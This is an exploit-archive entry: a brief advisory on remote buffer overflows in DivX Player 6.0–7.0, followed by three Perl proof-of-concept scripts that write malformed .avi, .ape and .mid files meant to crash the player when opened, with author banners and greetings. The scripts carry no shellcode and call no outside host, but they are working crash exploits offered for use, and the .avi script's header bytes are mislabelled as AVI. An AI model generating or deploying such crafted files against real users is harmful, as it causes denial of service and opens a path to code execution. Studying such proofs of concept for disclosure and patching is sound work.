source: http://www.securityfocus.com/bid/47042/info

DivX Player is prone to multiple remote buffer-overflow vulnerabilities because the application fails to perform adequate boundary checks on user-supplied input.

Attackers may leverage these issues to execute arbitrary code in the context of the application. Failed attacks will cause denial-of-service conditions.

DivX Player 6.0, 6.8, 6.9, and 7.0 are vulnerable; other versions may also be affected. 

================================
#!/usr/bin/perl

###
# Title : DivX Player v7.0 (.avi) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Overflow in 'DivX Player.exe' Process
# Tested on : Windows XP SP3 Fran.ais 
# Target : DivX Player v6.8 & 6.9 & 7.0
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat AVI file (14 bytes)
#      =>    2 - Open AVI file With DivX Player
#      =>    3 -  OverFlow & Crshed !!!
# ------------
# Homologue Bug in MP_Classic: (http://exploit-db.com/exploits/11535) || By : cr4wl3r 
# ------------
# Assembly Error in [quartz.dll] ! 74872224() ! :
# 0x74872221 ,0x83 0xd2 0x00 || [adc] edx,0
# 0x74872224 ,0xf7 0xf1 [div] || eax,acx << (" Error Here ")
# 0x74872226 ,0x0f 0xa4 0xc2 0x10 [shld] || edx,eax,10h
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |============================================|\n";
print "    |= [!] Name : DivX Player v6 & 7.0 AVI File =|\n";
print "    |= [!] Exploit : Local Buffer Overflow      =|\n";
print "    |= [!] Author : KedAns-Dz                   =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com       =|\n";
print "    |============================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x54\x68\x64\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00"; # AVI Header
open(file , ">", "Kedans.avi"); # Evil File AVI (14 bytes) 4.0 KB
print file $PoC;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  

# Thanks To : ' cr4wl3r ' From Indonesia & All Indonesia MusLim HacKers

#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Islampard * Zaki.Eng * Dr.Ride * Red1One * Badr0 * XoreR * Nor0 FouinY * Hani * Mr.Dak007 * Fox-Dz
# Masimovic * TOnyXED * cr4wl3r (Inj3ct0r.com) * TeX (hotturks.org) * KelvinX (kelvinx.net) * Dos-Dz
# Nayla Festa * all (sec4ever.com) Members * PLATEN (Pentesters.ir) * Gamoscu (www.1923turk.com)
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Indoushka (Inj3ct0r.com) * [ Ma3sTr0-Dz * MadjiX * BrOx-Dz * JaGo-Dz (sec4ever.com) ] * Dr.0rYX 
# Cr3w-DZ * His0k4 * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# www.packetstormsecurity.org * exploit-db.com * bugsearch.net * 1337day.com * x000.com 
# www.metasploit.com * www.securityreason.com *  All Security and Exploits Webs ...
#================================================================================================



================================
#!/usr/bin/perl

###
# Title : DivX Player v7.0 (.ape) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Overflow in 'DivX Player.exe' Process
# Tested on : Windows XP SP3 Fran.ais 
# Target : DivX Player v6.8 & 6.9 & 7.0
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat APE file ( Monkey's Audio Format )
#      =>    2 - Open APE file With DivX Player 
#      =>    3 -  OverFlow !!!
# Assembly Error in [MonkeySource.ax] ! 0f4151a6() ! :
# 0x0f4151a3 ,0xc2 0x80 0x00 [ret] || 8
# 0x0f4151a6 ,0xf7 0xf3 [div] || eax,abx << (" Error Here ")
# 0x0f4151a8 ,0x31 0xd2 [xor] || edx,edx
# 0x0f4151aa ,0xeb 0xf3 [jmp] || 0x0f41519f
# 0x0f4151ac ,0xc3 [ret] || 
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |===========================================================|\n";
print "    |= [!] Name : DivX Player v6 & 7.0 || Monkey's Audio File  =|\n";
print "    |= [!] Exploit : Buffer Overflow Exploit                   =|\n";
print "    |= [!] Author : KedAns-Dz                                  =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
print "    |===========================================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = "\x4D\x41\x43\x20\x96\x0f\x00\x00\x34\x00\x00\x00\x18\x00\x00\x00"; # APE Header
open(file , ">", "Kedans.ape"); # Evil File APE (16 bytes) 4.0 KB
print file $PoC;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  
#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Islampard * Zaki.Eng * Dr.Ride * Red1One * Badr0 * XoreR * Nor0 FouinY * Hani * Mr.Dak007 * Fox-Dz
# Masimovic * TOnyXED * cr4wl3r (Inj3ct0r.com) * TeX (hotturks.org) * KelvinX (kelvinx.net) * Dos-Dz
# Nayla Festa * all (sec4ever.com) Members * PLATEN (Pentesters.ir) * Gamoscu (www.1923turk.com)
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Indoushka (Inj3ct0r.com) * [ Ma3sTr0-Dz * MadjiX * BrOx-Dz * JaGo-Dz (sec4ever.com) ] * Dr.0rYX 
# Cr3w-DZ * His0k4 * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# www.packetstormsecurity.org * exploit-db.com * bugsearch.net * 1337day.com * x000.com 
# www.metasploit.com * www.securityreason.com *  All Security and Exploits Webs ...
#================================================================================================


================================
#!/usr/bin/perl

###
# Title : DivX Player v7.0 (.mid) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows 
# Impact : Overflow in 'DivX Player.exe' Process
# Tested on : Windows XP SP3 Fran.ais 
# Target : DivX Player v6.8 & 6.9 & 7.0
###
# Note : BAC 2011 Enchallah ( KedAns 'me' & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Usage : 1 - Creat MID file 
#      =>    2 - Open MID file With DivX Player 
#      =>    3 -  OverFlow !!!
# ------------
# Homologue Bug in MP_Classic: (http://exploit-db.com/exploits/9620) || By : PLATEN 
# ------------
# Assembly Error in [quartz.dll] ! 74872224() ! :
# 0x74872221 ,0x83 0xd2 0x00 || [adc] edx,0
# 0x74872224 ,0xf7 0xf1 [div] || eax,acx << (" Error Here ")
# 0x74872226 ,0x0f 0xa4 0xc2 0x10 [shld] || edx,eax,10h
# ------------
#START SYSTEM /root@MSdos/ :
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";                  
print "    |===========================================|\n";
print "    |= [!] Name : DivX Player v6 & 7.0 (.mid)  =|\n";
print "    |= [!] Exploit : Buffer Overflow Exploit   =|\n";
print "    |= [!] Author : KedAns-Dz                  =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com      =|\n";
print "    |===========================================|\n";
sleep(2);
print "\n";
# Creating ...
my $PoC = # MID Header
"\x4d\x54\x68\x64\x00\x00\x00\x06\x00\x01\x00\x01\x00\x60\x4d\x54".
"\x72\x6b\x00\x00\x00\x4e\x00\xff\x03\x08\x34\x31\x33\x61\x34\x61".
"\x35\x30\x00\x91\x41\x60\x01\x3a\x60\x01\x4a\x60\x01\x50\x60\x7d".
"\x81\x41\x01\x01\x3a\x5f\x8d\xe4\xa0\x01\x50\x01\x3d\x91\x41\x60".
"\x81\x00\x81\x41\x40\x00\x91\x3a\x60\x81\x00\x76\x6f\xcc\x3d\xa6".
"\xc2\x48\xee\x8e\xca\xc2\x57\x00\x91\x50\x60\x81\x00\x81\x50\x40".
"\x00\xff\x2f\x00";
open(file , ">", "Kedans.mid"); # Evil File MID (100 bytes) 4.0 KB
print file $PoC;  
print "\n [+] File successfully created!\n" or die print "\n [-] OpsS! File is Not Created !! ";
close(file);  

# Thanks To : ' PLATEN  '  & All Iranian MusLim HacKers

#================[ Exploited By KedAns-Dz * HST-Dz * ]===========================================  
# Greets To : [D] HaCkerS-StreeT-Team [Z] < Algerians HaCkerS >
# Islampard * Zaki.Eng * Dr.Ride * Red1One * Badr0 * XoreR * Nor0 FouinY * Hani * Mr.Dak007 * Fox-Dz
# Masimovic * TOnyXED * cr4wl3r (Inj3ct0r.com) * TeX (hotturks.org) * KelvinX (kelvinx.net) * Dos-Dz
# Nayla Festa * all (sec4ever.com) Members * PLATEN (Pentesters.ir) * Gamoscu (www.1923turk.com)
# Greets to All ALGERIANS EXPLO!TER's & DEVELOPER's :=> {{
# Indoushka (Inj3ct0r.com) * [ Ma3sTr0-Dz * MadjiX * BrOx-Dz * JaGo-Dz (sec4ever.com) ] * Dr.0rYX 
# Cr3w-DZ * His0k4 * El-Kahina * Dz-Girl * SuNHouSe2 ; All Others && All My Friends . }} ,
# www.packetstormsecurity.org * exploit-db.com * bugsearch.net * 1337day.com * x000.com 
# www.metasploit.com * www.securityreason.com *  All Security and Exploits Webs ...
#================================================================================================